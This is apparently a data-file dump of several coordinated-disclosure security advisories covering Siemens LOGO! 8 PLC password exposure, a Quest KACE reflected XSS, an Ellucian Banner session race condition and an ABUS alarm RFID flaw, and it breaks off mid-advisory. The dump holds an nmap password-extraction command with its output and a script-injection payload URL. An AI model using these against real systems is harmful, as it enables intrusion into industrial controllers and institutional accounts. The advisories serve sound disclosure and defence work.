The manufacturer describes the product as follows (see [1]):
""Simple installation, minimum wiring, user-friendly programming: You can
easily implement small automation projects with LOGO!, the intelligent
logic module from Siemens. The LOGO! Logic Module saves space in the
control cabinet, and lets you easily implement functions, such as
time-delay switches, time relays, counters and auxiliary relays. ""
Due to storing passwords in a recoverable format on LOGO! 8 PLCs, an
attacker can gain access to configured passwords as cleartext.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
SySS GmbH found out that passwords are stored in a recoverable format on
LOGO! 8 PLCs.
Thus, if an attacker finds a way to retrieve this password data, for
instance exploiting the security vulnerabilities described in the SySS
security advisories SYSS-2019-012 [2] and SYSS-2019-013 [3], direct
access to cleartext passwords is given.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
SySS GmbH could successfully extract sensitive data such as configured
passwords as cleartext from a LOGO! 8 using a developed Nmap script.
The following Nmap output exemplarily shows extracting cleartext
password data from a LOGO! 8 PLC:
$ nmap -p 10005 --script slig.nse 192.168.10.112
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-16 17:21 CEST
Nmap scan report for 192.168.10.112
Host is up (0.00044s latency).
PORT STATE SERVICE
10005/tcp open stel
| slig: Gathered Siemens LOGO!8 access details and passwords
| User: LSCUser
| Password: S3cret1
| Enabled: True
| User: AppUser
| Password: S3cret2
| Enabled: True
| User: WebUser
| Password: S3cret3
| Enabled: True
| User: TDUser
| Password: S3cret4
| Enabled: True
| Protection: Password
| Program password: SECRET
|_MMC serial: x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00
Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds
A successful attack against a LOGO! 8 extracting all configured
passwords is demonstrated in our SySS PoC video [7].
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
In the publicly released Siemens Security Advisory SSA-542701 [3],
the manufacturer Siemens recommends to apply a defense-in-depth concept,
including protection concept outlined in the system manual, as a
mitigation for reducing the risk of the described security issue.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2019-04-04: Vulnerability reported to manufacturer
2019-04-04: Manufacturer confirms receipt of security advisory and
asks for referenced Nmap script
2019-04-04: SySS provides PoC Nmap script
2019-05-14: Public release of Siemens Security Advisory SSA-542701
2019-05-29: Public release of SySS security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Product website for Siemens LOGO!
https://new.siemens.com/global/en/products/automation/systems/industrial/plc/logo.html
[2] SySS Security Advisory SYSS-2019-012
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2019-012.txt
[3] SySS Security Advisory SYSS-2019-013
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2019-013.txt
[4] SySS Security Advisory SYSS-2019-014
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2019-014.txt
[5] Siemens Security Advisory SSA-542701
https://cert-portal.siemens.com/productcert/pdf/ssa-542701.pdf
[6] SySS Responsible Disclosure Policy
https://www.syss.de/en/responsible-disclosure-policy/
[7] SySS Proof-of-Concept Video ""Siemens LOGO! 8 PLC Password Hacking""
https://youtu.be/TpH4EABGYCs
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Manuel Stotz of SySS GmbH.
E-Mail: manuel.stotz (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Manuel_Stotz.asc
Key fingerprint = F051 5B74 7E70 193E 7F66 0133 E790 F68A BCE6 8C6D
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIzBAEBCgAdFiEE0fCgNfBs5nXNuQUU2aS/ajStTasFAlztdr8ACgkQ2aS/ajSt
TasxbQ/+PJBnR7LHclINEMabNhgqI5k98QsHLesp+++pKtyJoBm/9znzMLkv9rUw
nt8uRC2qlObbPMmnEMGSHGZU9wYATyo1e8jiv4X9Nxqa6XxuhApXa7un6ExDkrCm
PDxQ0L8WmH6/gkpRqoijrhk+5n16sG5BtMRi/fwTHtz1GvpBAMIpuR+ZbgLmlqjW
V2Ta/0ZMEUw7ANSL3WwPZa9uowuRfV6hAUWPRz5aP4KcxkoasE2WBz81kmc3GEYl
cJ40pqE8hOTBC+fCgUElSLbmfr4tbDJw3u3KayAJA27Qu+IhBvrwEVGBsDb+MJ95
wd553soH6ehILtthKVPrUU53jZWQrOjmqbu8mLG9oCAoaVIR9gsxnxJ5NohoIH+I
vkvMo7RygY7GrBeWqPAZWm4N790PA3miKhDUrEgTJtTVb5bZ+h362K0AQD9PauAu
nbR9Ui8ZDqr+64tCP00C2YkoMZKSkxdnwRdIEn/njcDfKgMi5JBbBQwRX9JiUOly
b1QT+X9iaMEdIqzYmSMchEm4/FW5yox+Q0nFjkPiE/uGUmZFDKxdQr8bQcHisWXi
HcecHC6aknlJwkhHduK4meC/935c1qcaR9DA3O18JdqaonlaU1PezkivK6Yy80u4
XYUJ6umZh1gw/Ghx4+EorJqKnoZtaZWGVyTk0JKmIXa+AvWZV5w=
=cc0p
-----END PGP SIGNATURE-----"
428,[SYSS-2019-013]: Siemens LOGO! 8 - Missing Authentication for Critical Function (CWE-306),CWE-306,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2019-013
Product: LOGO!
Manufacturer: Siemens
Affected Version(s): LOGO! 8 (all versions)
Tested Version(s): LOGO! 8, 6ED1052-2MD00-0BA8 FS:03, 0BA8.Standard V1.08.03
Vulnerability Type: Missing Authentication for Critical Function (CWE-306)
Risk Level: High
Solution Status: Open
Manufacturer Notification: 2019-04-04
Solution Date: 2019-05-14 (recommended mitigation by manufacturer)
Public Disclosure: 2019-05-29
CVE Reference: CVE-2019-10919
Authors of Advisory: Manuel Stotz (SySS GmbH), Matthias Deeg (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
Siemens LOGO! is a programmable logic controller (PLC) for small
automation tasks.
The manufacturer describes the product as follows (see [1]):
""Simple installation, minimum wiring, user-friendly programming: You can
easily implement small automation projects with LOGO!, the intelligent
logic module from Siemens. The LOGO! Logic Module saves space in the
control cabinet, and lets you easily implement functions, such as
time-delay switches, time relays, counters and auxiliary relays. ""
Due to storing passwords in a recoverable format on LOGO! 8 PLCs, an
attacker can gain access to configured passwords as cleartext.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
SySS GmbH found out that the provided function ""GetProfile"" of a LOGO! 8
PLC that is for instance used by the software tool LOGO! Soft Comfort
does not require any authentication.
Thus, an attacker can send a ""GetProfile"" query to a LOGO! 8 PLC and
will receive the requested profile information containing sensitive
data such as different configured passwords.
This profile data is encrypted - but it is encrypted via 3DES using a
static, hard-coded cryptographic key, which is described in the SySS
security advisory SYSS-2019-012 [2]. So, by knowing this 3DES key, an
attacker can simply decrypt all sensitive data and use the contained
cleartext passwords (see SySS security advisory SYSS-2019-014 [3]) in
further attacks.
Furthermore, SySS GmbH found out that the provided function for setting
password data on a LOGO! 8 PLC can also be used without any
authentication. Therefore, an attacker can simply set arbitrary
passwords by sending a specific request to the LOGO! 8 PLC via the
network.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
SySS GmbH could successfully extract sensitive data such as configured
passwords as cleartext from a LOGO! 8 using a developed Nmap script.
The following Nmap output exemplarily shows extracting cleartext
password data from a LOGO! 8 PLC:
$ nmap -p 10005 --script slig.nse 192.168.10.112
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-04 09:35 CEST
Nmap scan report for 192.168.10.112
Host is up (0.00044s latency).
PORT STATE SERVICE
10005/tcp open stel
| slig: Gathered Siemens LOGO!8 access details and passwords
| User: LSCUser
| Password: S3cret1
| Enabled: True
| User: AppUser
| Password: S3cret2
| Enabled: True
| User: WebUser
| Password: S3cret3
| Enabled: True
| User: TDUser
| Password: S3cret4
| Enabled: True
| Protection: Password
| Program password: SECRET
|_MMC serial: x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00
Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds
A successful attack against a LOGO! 8 extracting all configured
passwords is demonstrated in our SySS PoC video [7].
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
In the publicly released Siemens Security Advisory SSA-542701 [3],
the manufacturer Siemens recommends to apply a defense-in-depth concept,
including protection concept outlined in the system manual, as a
mitigation for reducing the risk of the described security issue.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2019-04-04: Vulnerability reported to manufacturer
2019-04-04: Manufacturer confirms receipt of security advisory and
asks for referenced Nmap script
2019-04-04: SySS provides PoC Nmap script
2019-05-14: Public release of Siemens Security Advisory SSA-542701
2019-05-29: Public release of SySS security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Product website for Siemens LOGO!
https://new.siemens.com/global/en/products/automation/systems/industrial/plc/logo.html
[2] SySS Security Advisory SYSS-2019-012
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2019-012.txt
[3] SySS Security Advisory SYSS-2019-014
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2019-014.txt
[4] SySS Security Advisory SYSS-2019-013
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2019-013.txt
[5] Siemens Security Advisory SSA-542701
https://cert-portal.siemens.com/productcert/pdf/ssa-542701.pdf
[6] SySS Responsible Disclosure Policy
https://www.syss.de/en/responsible-disclosure-policy/
[7] SySS Proof-of-Concept Video ""Siemens LOGO! 8 PLC Password Hacking""
https://youtu.be/TpH4EABGYCs
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Manuel Stotz of SySS GmbH.
E-Mail: manuel.stotz (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Manuel_Stotz.asc
Key fingerprint = F051 5B74 7E70 193E 7F66 0133 E790 F68A BCE6 8C6D
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIzBAEBCgAdFiEE0fCgNfBs5nXNuQUU2aS/ajStTasFAlztdrYACgkQ2aS/ajSt
TavHlQ//YulVlc5iY79/lC2bjZ2X0Pelm9XQypoF57jaw2k2wajcsFThTLzTWQcV
tqVSEsPGujUwHDH3Rv8zGqYg2F9SN9UmQWwzKAkeJXOms1QreXShVmy7Nry5N/Hj
D9fbDlKCtCs0AtO0DBhmuzU/SGmtG7r9Y5gMME2N/6vz/73Q9m4dbh0qwnfHPuGV
nm+gpk6Yj0cF+W8ABWqYrcFBMrVW2fekoEHIWM4asXbVQIp7vK9mz0e0N7+g3mDQ
hdQBSbS33fI+ogLeMIMK3XFfkSs+Qaqbktp8URVTph6t81e5ieJZi4+aByxHUBJe
U85xkmm0XIx+xU+AkXn1o1dNw/VLtEo4p3oX3MEDvdm6OZlggJTf3fQ3RqIErbAH
s+io1YqLFxGyNRR0Pm2SjjnKZMaUe4pWtXajLDmCNEIcpfXP7NAtF8OLcW/Ap0X+
cJKKyg1Ko0vREvm+FF4kwjl6XzIc6ZCqN+v18t+1IVQGTN6Wt3KUqewYAk7fBwS6
9khelke73n5KJIsG8vN48+16+B52oPAkmHoLBiy+QCfih/3h89sHx1nA6fL1Ig/e
z/WuTeRCfR3USispPEpk5WHMORpl/QGGuqmcxaqLfFLHXB3h/XhyKHCMK05N6U7t
YfZSAGDgpCHETx6mADQVAlw8M5KEI8gXcopINBcx5aRvcYcV3Qg=
=ga4S
-----END PGP SIGNATURE-----"
429,[SYSS-2019-012]: Siemens LOGO! 8 - Use of Hard-coded Cryptographic Key (CWE-321),CWE-321,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2019-012
Product: LOGO!
Manufacturer: Siemens
Affected Version(s): LOGO! 8 (all versions)
Tested Version(s): LOGO! 8, 6ED1052-2MD00-0BA8 FS:03, 0BA8.Standard V1.08.03
Vulnerability Type: Use of Hard-coded Cryptographic Key (CWE-321)
Risk Level: High
Solution Status: Open
Manufacturer Notification: 2019-04-04
Solution Date: 2019-05-14 (recommended mitigation by manufacturer)
Public Disclosure: 2019-05-29
CVE Reference: CVE-2019-10920
Authors of Advisory: Manuel Stotz, Matthias Deeg (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
Siemens LOGO! is a programmable logic controller (PLC) for small
automation tasks.
The manufacturer describes the product as follows (see [1]):
""Simple installation, minimum wiring, user-friendly programming: You can
easily implement small automation projects with LOGO!, the intelligent
logic module from Siemens. The LOGO! Logic Module saves space in the
control cabinet, and lets you easily implement functions, such as
time-delay switches, time relays, counters and auxiliary relays. ""
Due to the use of a hard-coded cryptographic key, an attacker can put
the integrity and confidentiality of encrypted data of all LOGO! 8 PLCs
using this key at risk, for instance decrypting network communication
during a man-in-the-middle attack.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
SySS GmbH found out that LOGO! PLCs use a static, hard-coded
cryptographic 3DES key for protecting sensitive information, like
network communication and configuration data.
For instance, this key can be found within the LOGO! Soft Comfort
software.
By knowing this static cryptographic 3DES key, an attacker can decrypt
all LOGO! data that is encrypted with this key and gain access to
sensitive data, for instance different configured passwords.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
SySS GmbH used the hard-coded cryptographic 3DES key in a software tool
(Nmap script) for extracting sensitive data such as configured passwords
as cleartext.
The following Nmap output exemplarily shows extracting password data
from a LOGO! 8 PLC:
$ nmap -p 10005 --script slig.nse 192.168.10.112
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-04 09:35 CEST
Nmap scan report for 192.168.10.112
Host is up (0.00044s latency).
PORT STATE SERVICE
10005/tcp open stel
| slig: Gathered Siemens LOGO!8 access details and passwords
| User: LSCUser
| Password: S3cret1
| Enabled: True
| User: AppUser
| Password: S3cret2
| Enabled: True
| User: WebUser
| Password: S3cret3
| Enabled: True
| User: TDUser
| Password: S3cret4
| Enabled: True
| Protection: Password
| Program password: SECRET
|_MMC serial: x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00
Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds
A successful attack against a LOGO! 8 extracting all configured
passwords is demonstrated in our SySS PoC video [5].
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
In the publicly released Siemens Security Advisory SSA-542701 [3],
the manufacturer Siemens recommends to apply a defense-in-depth concept,
including protection concept outlined in the system manual, as a
mitigation for reducing the risk of the described security issue.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2019-04-04: Vulnerability reported to manufacturer
2019-04-04: Manufacturer confirms receipt of security advisory and
asks for referenced Nmap script
2019-04-04: SySS provides PoC Nmap script
2019-05-14: Public release of Siemens Security Advisory SSA-542701
2019-05-29: Public release of SySS security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Product website for Siemens LOGO!
https://new.siemens.com/global/en/products/automation/systems/industrial/plc/logo.html
[2] SySS Security Advisory SYSS-2019-012
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2019-012.txt
[3] Siemens Security Advisory SSA-542701
https://cert-portal.siemens.com/productcert/pdf/ssa-542701.pdf
[4] SySS Responsible Disclosure Policy
https://www.syss.de/en/responsible-disclosure-policy/
[5] SySS Proof-of-Concept Video ""Siemens LOGO! 8 PLC Password Hacking""
https://youtu.be/TpH4EABGYCs
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Manuel Stotz of SySS GmbH.
E-Mail: manuel.stotz (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Manuel_Stotz.asc
Key fingerprint = F051 5B74 7E70 193E 7F66 0133 E790 F68A BCE6 8C6D
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIzBAEBCgAdFiEE0fCgNfBs5nXNuQUU2aS/ajStTasFAlztdqYACgkQ2aS/ajSt
TasISA//dtwHnSZdvACoHTD0pVUb5E/z5fzEWHp3YTJX3kUpQAokN9QVtdI1H02x
qyVq+72zeXifOBPVlvlX3JNBPDkYzYUzdR5idH7WuApdQ/FdKFw8Nv292oTib+OL
zP4NxysKCkgAWhTWL5YZTioFUUB3W36rohEK2W2qfCqzUOEjhLmCdcnGv4PTgvU0
uW7LOFPC/GvCuV1KfluwOREyleX3X1LNpmJjW3W1ZQ3l1plwAHLGrCXJm+78b/Vi
Xm9B/GhCfdcPsvHo/EJwAJG7RUAHKjBtUybPSujNj3Dv04W5X6tPDUjkuqfNgROZ
BSqn1tp8GRh8tKns22/lAkW8bJqSbTW3R/DqXh5yRUPVM0wdo24IGDEChZOt4sMM
UP9AVY3IJI7KaqZTRFSZC2x3IdSCcNdUNstgzeJNaZLESt29krYGpRv1JLx2yFeV
14qMQUYl7X1uyLA499HRYaRoxUwo7jGOiABIv7US+HaLusXQ/+lp5spSdFy+VxEd
blVnM0HXW3XAo3CM0T5xtPuHtEgvdLuZCtsAkG2rAU/Q95B93YrCd2WOQaH2Czgd
y74XQdJ3O6sGGCSwVa+SWpA/3BJMAu2CKpqLJLnK/os9z9Z5q62/8s4KP86L/U6X
mGWtQbe5s8Z+ikpXm1Ey7AqFrWftQYn4Ujiv/H4SjrgJBMTZAHk=
=1IGg
-----END PGP SIGNATURE-----"
437,[CVE-2019-11604] Quest KACE Systems Management Appliance <= 9.0 kbot_service_notsoap.php METHOD Reflected Cross-Site Scripting,,CVE-2019-11604,"RCE Security Advisory
https://www.rcesecurity.com
1. ADVISORY INFORMATION
=======================
Product: Quest KACE Systems Management Appliance
Vendor URL: www.quest.com
Type: Cross-Site Scripting [CWE-79]
Date found: 2018-09-09
Date published: 2019-05-19
CVSSv3 Score: 4.7 (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N)
CVE: CVE-2019-11604
2. CREDITS
==========
This vulnerability was discovered and researched by Julien Ahrens from
RCE Security.
3. VERSIONS AFFECTED
====================
Quest KACE Systems Management Appliance 9.0 and below
4. INTRODUCTION
===============
The KACE Systems Management Appliance (SMA) helps you accomplish these goals
by automating complex administrative tasks and modernizing your unified endpoint
management approach. This makes it possible for you to inventory all hardware
and software, patch mission-critical applications and OS, reduce the risk of
breach, and assure software license compliance. So you're able to reduce systems
management complexity and safeguard your vulnerable endpoints.
(from the vendor's homepage)
5. VULNERABILITY DETAILS
========================
The script ""/service/kbot_service_notsoap.php"" is vulnerable to an unauthenticated
reflected Cross-Site Scripting vulnerability when user-supplied input to the
HTTP GET parameter ""METHOD"" is processed by the web application. Since the
application does not properly validate and sanitize this parameter, it is
possible to place arbitrary script code onto the same page.
The following Proof-of-Concept triggers this vulnerability:
https://127.0.0.1/service/kbot_service_notsoap.php?METHOD=<script>alert(document.domain)</script>
6. RISK
=======
To successfully exploit this vulnerability an unauthenticated or authenticated
user must be tricked into visiting an arbitrary website.
The vulnerability can be used to temporarily embed arbitrary script code into the
context of the appliance web interface, which offers a wide range of possible
attacks such as redirecting the user to a malicious page, spoofing content on the
page or attacking the browser and its plugins. Since all session-relevant cookies
are protected by HTTPOnly, it is not possible to hijack sessions.
7. SOLUTION
===========
Update to Quest KACE Systems Management Appliance 9.1
8. REPORT TIMELINE
==================
2018-09-09: Discovery of the vulnerability
2019-02-28: Tried to notify vendor via their vulnerability report form
but unfortunately the WAF protecting the form blocked the
Proof-of-Concept payload
2019-02-28: Sent another notification without any payloads
2019-02-28: Vendor response
2019-03-01: Sent the exploit payload in a separate mail
2019-03-01: Vendor acknowledges the issue (tracked as K1-20409) which will
be fixed in the 9.1 release (released on 2019/04/15)
2019-03-01: Vendor asks to delay the disclosure to make sure all customers
had time to upgrade
2019-03-13: Requested disclosure extension granted
2019-04-30: CVE requested from MITRE
2019-04-30: MITRE assigns CVE-2019-11604
2019-05-19: Public disclosure
9. REFERENCES
=============
-"
463,[CVE-2019-8978] Improper Authentication (CWE-287) in Ellucian Banner Web Tailor and Banner Enterprise Identity Services,CWE-287,CVE-2019-8978,"===================
Title: [CVE-2019-8978] Improper Authentication (CWE-287) in Ellucian Banner Web Tailor and Banner Enterprise Identity Services
Author: Joshua Mulliken <joshua mulliken net>
Thanks to: Carnegie Mellon University CERT Coordination Center
Date Found: Dec. 17, 2018
Vendor: Ellucian Company L.P.
Vendor Homepage: https://www.ellucian.com
Products: Banner Web Tailor and Banner Enterprise Identity Services
Web Tailor Affected Versions: 8.8.3, 8.8.4, 8.9
Banner Enterprise Identity Services Affected Versions: 8.3, 8.3.1, 8.3.2, 8.4
CVE: CVE-2019-8978
===================
Table of Contents
=================
=-=-=-=-=-=-=-=-=
1 - Executive Summary
2 - Product
3 - Impact and Recommendations
a - Impact
b - Recommendations
4 - Technical Details
a - Technical Description
b - Exploit Code
5 - Disclosure Time-line
6 - References
=-=-=-=-=-=-=-=-=
1) Executive Summary
====================
An improper authentication vulnerability (CWE-287) was identified in Banner Web Tailor and Banner Enterprise Identity Services. This vulnerability is produced when SSO Manager is used as the authentication mechanism for Web Tailor, where this could lead to information disclosure and loss of data integrity for the impacted user(s). The vendor has verified the vulnerability and produced a patch that is now available. For more information see the postings on Ellucian Communities: [LINK NOT PROVIDED BEFORE DEADLINE] and Banner Enterprise Identity Services: [LINK NOT PROVIDED BEFORE DEADLINE]. [1]
2) Product
==========
Banner Web Tailor is a web tool, made for higher education institutions, that provides registration, curriculum management, advising, administration, and reporting functionality. Students are able to access and change their registration, graduation, and financial aid information. Professors and teachers are able to input final grades and manage their courses. Administrators are able to access and change student and teacher information. It is used by hundreds of institutions, many of which have opted to use the Single Sign-on Manager in order to participate in CAS- and SAML-based single sign-on services. [2]
3) Impact and Recommendations
=============================
a) Impact
---------
A user's unique identifier, UDCID, is leaked via a cookie and it could lead to account compromise if this identifier is captured or otherwise known, in the case tested the UDCID was known to be the institutional ID printed on ID cards. The UDCID could be used to exploit a race condition that would provide an attacker with unauthorized access. For a student, the attacker could drop them from their courses, reject financial aid, change their personal information, etc. For a professor, this could lead to an inability to manage their courses, allow a malicious student to put in false final grades, etc. For an administrator, an attacker could change users information, place false holds on student accounts, etc.
b) Recommendations
------------------
Organizations affected should update to the latest version. More information can be found in the postings on Ellucian Communities: [LINK NOT PROVIDED BEFORE DEADLINE] and Banner Enterprise Identity Services: [LINK NOT PROVIDED BEFORE DEADLINE]. Please utilize Ellucian Communities or contact Ellucian through ActionLine to get more information. Updates to this disclosure will be avaliable on GitHub: https://github.com/JoshuaMulliken/CVE-2019-8978
4) Technical Details
====================
a) Technical Description
------------------------
The improper authentication vulnerability can be exploited through a race condition that occurs in Ellucian Banner Web Tailor, in conjunction with SSO Manager. This vulnerability allows remote attackers to steal a victim's session (and cause a denial of service) by repeatedly requesting the initial Banner Web Tailor main page with the IDMSESSID cookie set to the victim's UDCID, which in the case tested is the institutional ID. During a login attempt by a victim, the attacker can leverage the race condition and will be issued the SESSID that was meant for this victim. See proof of concept code located at the GitHub link below for more details.
b) Exploit Code
---------------
Exploit code will be made available later via Github: https://github.com/JoshuaMulliken/CVE-2019-8978
5) Disclosure Time-line
=======================
December 18, 2018: Attempted reporting through Ellucian's marketing web-form and sent to informationsecurityassessmentteam ellucian com
December 20, 2018: Submitted report to CERT Coordination Center at Carnegie Mellon University
January 2, 2019: Submitted report to a CISO at Ellucian who was discovered through LinkedIn
January 2, 2019: Requested information on responsible disclosure procedure from the University of South Carolina
January 3, 2019: Was told to report through ActionLine by Ellucian
January 4, 2019: Was told by the University of South Carolina that there is no procedure for reporting vulnerabilities
January 4, 2019: Told the University of South Carolina that I had discovered a vulnerability in Banner
February 18, 2019: CERT informed me of failure to reach the vendor and advised me to publicly disclose
February 25, 2019: Sent draft of advisory to Ellucian and set the date of disclosure to March 4th.
February 28, 2019: Ran demo of vulnerability for Ellucian over Zoom conference
March 1, 2019: Was asked by the University of South Carolina to delay publication
March 21, 2019: The University of South Carolina received a backported patch from Ellucian
March 26, 2019: Ellucian finalized patches for all versions
March 29, 2019: Was told by Ellucian that the University of South Carolina would be doing changes on the 1st of April
April 1, 2019: Requested information on patch status from the University of South Carolina
April 5, 2019: The University of South Carolina gave ETA of April 30, 2019
April 30, 2019: The University of South Carolina updated ETA to the middle of May
May 7, 2019: Set publication date of disclosure to May 13
May 10, 2019: The University of South Carolina posted a planned outage notice for all Banner Services scheduled for May 11
May 11, 2019: The University of South Carolina successfully installed the patch
May 13, 2019: Disclosure published
6) References
=============
[1] https://cwe.mitre.org/data/definitions/287.html
[2] https://www.ellucian.com/solutions/ellucian-banner-student"
484,[SYSS-2019-005]: ABUS Secvest - Proximity Key - Cryptographic Issues (CWE-310),CWE-310,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2019-005
Product: ABUS Secvest (FUAA50000)
Manufacturer: ABUS
Affected Version(s): v3.01.01
Tested Version(s): v3.01.01
Vulnerability Type: Cryptographic Issues (CWE-310)
Risk Level: Medium
Solution Status: Open
Manufacturer Notification: 2019-03-15
Solution Date: -
Public Disclosure: 2019-05-02
CVE Reference: CVE-2019-9861
Authors of Advisory: Matthias Deeg, Gerhard Klostermeier (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
ABUS Secvest (FUAA50000) is a wireless alarm system with different
features.
Some of the supported features as described by the manufacturer are
(see [1]):
""
* Convenient operation via the app (Android/iOS), integrated web
browser and also at the alarm panel
* For up to 50 users with freely selectable control options
(code/chip key/remote control)
* Active intrusion protection in combination with additional mechatronic
wireless window/door locks
* Video verification of alarms via email, push notifications or via the
app
* Up to 48 individually identifiable wireless detectors, eight control
panels, 50 remote controls
* Integrated dialling device
* VdS Home certified and EN 50131-1 Level 2
* Alarm verification via the integration of up to six IP cameras
* 32 additional wireless outputs for flexible event control
* Switching to monitoring station via protocols possible
""
Due to the use of an insecure RFID technology (MIFARE Classic), ABUS
proximity chip keys (RFID tokens) [2] of the ABUS Secvest wireless alarm
system can easily be cloned and used to deactivate the alarm system in
an unauthorized way.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
